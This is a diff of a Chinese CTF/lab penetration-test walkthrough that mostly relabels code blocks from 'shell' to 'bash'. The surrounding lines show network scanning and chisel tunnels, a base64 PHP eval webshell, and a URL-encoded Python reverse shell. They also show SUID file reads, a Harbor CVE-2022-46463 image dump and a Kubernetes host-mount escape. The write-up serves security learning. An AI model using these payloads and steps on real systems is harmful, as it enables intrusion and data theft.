@@ -20,7 +20,7 @@ Tags
 
 直接使用 `fscan` 进行扫描探测
 
-```shell
+```bash
 start infoscan
 8.130.110.24:8080 open
 8.130.110.24:22 open
@@ -69,7 +69,7 @@ flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}
 
 上传 `fscan` 到入口点靶机之后，查看网卡信息
 
-```shell
+```bash
 (remote) www-data@portal:/var/www/html/background/public$ ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.28.23.17  netmask 255.255.0.0  broadcast 172.28.255.255
@@ -92,7 +92,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 使用 `fscan` 进行扫描
 
-```shell title="172.28.23.0/24"
+```bash title="172.28.23.0/24"
 start infoscan
 trying RunIcmp2
 The current user permissions unable to send icmp packets
@@ -125,7 +125,7 @@ start vulscan
 
 ## 172.28.23.0/24 建立中转枢纽
 
-```shell title="vps"
+```bash title="vps"
 root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &
 root@jmt-projekt:~# 2024/08/16 10:58:03 server: Reverse tunnelling enabled
 2024/08/16 10:58:03 server: Fingerprint D9Wm+jW4SsG7MFgviTnkO7s3S7aNEYPubfsRa+k9pBM=
@@ -134,7 +134,7 @@ root@jmt-projekt:~# 2024/08/16 10:58:03 server: Reverse tunnelling enabled
 
 然后将 `chisel_1.9.1_linux_amd64` 传输到入口点靶机之后，执行连接
 
-```shell title="入口点"
+```bash title="入口点"
 (remote) www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:0.0.0.0:10000:socks &
 2024/08/16 10:59:36 client: Connecting to ws://139.*.*.*:1337
 2024/08/16 10:59:36 client: Connected (Latency 46.289192ms)
@@ -146,7 +146,7 @@ root@jmt-projekt:~# 2024/08/16 10:58:03 server: Reverse tunnelling enabled
 
 根据 `fscan` 的扫描结果，存在有 `poc-yaml-spring-actuator-heapdump-file` 信息泄露，尝试获取
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 wget http://172.28.23.33:8080/actuator/heapdump
 ......
@@ -181,7 +181,7 @@ algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES
 
 尝试连接位于 `59696` 端口的服务
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 nc 172.28.23.33 59696
 [proxychains] config file found: /etc/proxychains4.conf
@@ -311,7 +311,7 @@ p.interactive()
 
 借助 `proxychains` 将 python 脚本代理到内网中的靶机
 
-```shell
+```bash
 ┌──(env)(randark ㉿ kali)-[~/tmp]
 └─$ proxychains4 python3 pwn-exploit.py
 [proxychains] config file found: /etc/proxychains4.conf
@@ -352,7 +352,7 @@ flag{6a326f94-6526-4586-8233-152d137281fd}
 
 首先尝试目录扫描
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ dirsearch --proxy socks5://139.*.*.*:10000 -u http://172.28.23.26 -i 200
 ......
@@ -372,7 +372,7 @@ flag{6a326f94-6526-4586-8233-152d137281fd}
 
 结合 `fscan` 扫描得到的 `ftp 172.28.23.26:21:anonymous` 记录来看，可能 ftp 存在有信息泄露
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 ftp anonymous@172.28.23.26 21
 [proxychains] config file found: /etc/proxychains4.conf
@@ -454,7 +454,7 @@ imgbase64=data:image/png;base64,dGVzdA==
 
 测试一下，目标文件的内容确实为 `test`
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ proxychains4 http get 172.28.23.26/upload/2024-08-16-66bef298cdc19.png
 [proxychains] config file found: /etc/proxychains4.conf
@@ -522,7 +522,7 @@ imgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKSA/Pg==
 
 尝试进行利用
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ proxychains4 http get http://172.28.23.26/upload/.antproxy.php?cmd=whoami
 [proxychains] config file found: /etc/proxychains4.conf
@@ -546,7 +546,7 @@ www-data
 
 由于 `172.28.23.0/24` 这个内网没有出网的能力，所以需要将 vps 上的监听器端口转发到 `172.28.23.17 (入口点)` 上，以便于内网靶机的反弹 shell
 
-```shell title="172.28.23.17"
+```bash title="172.28.23.17"
 (remote) www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 9999:9999 &
 2024/08/16 15:00:55 client: Connecting to ws://139.*.*.*:1337
 2024/08/16 15:00:55 client: tun: proxy#9999=>9999: Listening
@@ -555,14 +555,14 @@ www-data
 
 然后借助在 OA 系统上部署的 webshell 来执行反弹 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ proxychains4 http get http://172.28.23.26/upload/.antproxy.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22172.28.23.17%22%2C9999%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
 ```
 
 成功收到反连 shell
 
-```shell
+```bash
 (remote) www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ whoami
 www-data
 ```
@@ -571,7 +571,7 @@ www-data
 
 尝试扫描 suid 特权文件，发现
 
-```shell
+```bash
 (remote) www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ find / -perm -u=s -type f 2>/dev/null
 /bin/fusermount
 /bin/ping6
@@ -592,7 +592,7 @@ www-data
 
 可以借助 `base32` 实现任意文件读取
 
-```shell
+```bash
 (remote) www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ base32 /flag02.txt | base32 -d
 flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}
 ```
@@ -607,7 +607,7 @@ flag{56d37734-5f73-447f-b1a5-a83f45549b28}
 
 查看网卡信息，发现存在双层内网
 
-```shell
+```bash
 (remote) www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ ifconfig
 eth0      Link encap:Ethernet  HWaddr 00:16:3e:03:44:3d
           inet addr:172.28.23.26  Bcast:172.28.255.255  Mask:255.255.0.0
@@ -643,7 +643,7 @@ lo        Link encap:Local Loopback
 
 首先，需要将公网 vps 的 chisel 监听端口 `1337` 转发到内网 `172.28.23.17 (入口点)`
 
-```shell title=""
+```bash title=""
 (remote) www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 1337:11337 &
 2024/08/16 15:14:59 client: Connecting to ws://139.*.*.*:1337
 2024/08/16 15:14:59 client: tun: proxy#1337=>11337: Listening
@@ -652,7 +652,7 @@ lo        Link encap:Local Loopback
 
 然后在一层内网与二层内网共在的靶机上建立转发
 
-```shell title="172.28.23.26 & 172.22.14.6"
+```bash title="172.28.23.26 & 172.22.14.6"
 (remote) www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client 172.28.23.17:1337 R:0.0.0.0:10001:socks &
 2024/08/16 15:24:51 client: Connecting to ws://172.28.23.17:1337
 2024/08/16 15:24:51 server: session#8: tun: proxy#R:10001=>socks: Listening
@@ -663,7 +663,7 @@ lo        Link encap:Local Loopback
 
 ## 内网扫描 172.22.14.0/24
 
-```shell
+```bash
 start ping
 (icmp) Target 172.22.14.6     is alive
 (icmp) Target 172.22.14.37    is alive
@@ -692,7 +692,7 @@ start vulscan
 
 使用 `CVE-2022-46463` 漏洞，将 Harbor 上的信息进行获取
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/pocs/CVE-2022-46463]
 └─$ proxychains4 -q python3 harbor.py http://172.22.14.46
 [*] API version used v2.0
@@ -705,7 +705,7 @@ start vulscan
 
 将 `harbor/secret` 这个镜像获取下来分析
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/pocs/CVE-2022-46463]
 └─$ proxychains python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2
 [proxychains] config file found: /etc/proxychains4.conf
@@ -732,7 +732,7 @@ start vulscan
 
 然后对镜像进行分析，在其中找到 flag 文件
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/pocs/CVE-2022-46463/caches/harbor_secret/latest]
 └─$ cat 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49/f1ag05_Yz1o.txt
 flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}
@@ -878,7 +878,7 @@ flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}
 
 首先先转发服务
 
-```shell title="172.22.14.6"
+```bash title="172.22.14.6"
 (remote) www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client 172.28.23.17:1337 R:0.0.0.0:10003:172.22.14.37:6443
 2024/08/16 16:25:08 client: Connecting to ws://172.28.23.17:1337
 2024/08/16 16:25:08 server: session#16: tun: proxy#R:10003=>172.22.14.37:6443: Listening
@@ -887,7 +887,7 @@ flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}
 
 然后尝试连接 Kubernetes 服务
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools]
 └─$ ./kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ get pods
 Please enter Username: a
@@ -900,7 +900,7 @@ nginx-deployment-58d48b746d-x26mr   1/1     Running   3          314d
 
 查看 pod 资源
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools]
 └─$ ./kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ describe pod nginx-deployment-58d48b746d-d6x8t
 Please enter Username: a
@@ -957,7 +957,7 @@ Events:          <none>
 
 于是，可以尝试编写一个 pod，将宿主机的根目录映射进去之后，指定 ssh 私钥并连接，即可对宿主机实现 getshell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ cat test.yaml
 apiVersion: v1
@@ -1000,7 +1000,7 @@ nginx-deployment-58d48b746d-x26mr   1/1     Running                3          31
 
 pod 成功部署之后，就可以开始写入 SSH 私钥
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ ~/tools/kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ exec -it nginx-deployment -- /bin/bash
 Please enter Username: a
@@ -1014,7 +1014,7 @@ exit
 
 然后就可以尝试连接宿主机了
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tmp]
 └─$ proxychains4 -q ssh -i id_rsa root@172.22.14.37
 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
@@ -1097,7 +1097,7 @@ spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
 
 首先，先将 Mysql 服务转发出来
 
-```shell title="172.22.14.6"
+```bash title="172.22.14.6"
 (remote) www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client 172.28.23.17:1337 R:0.0.0.0:10004:172.22.10.28:3306
 2024/08/16 16:25:08 client: Connecting to ws://172.28.23.17:1337
 2024/08/16 16:25:08 server: session#16: tun: proxy#R:10003=>172.22.14.37:6443: Listening
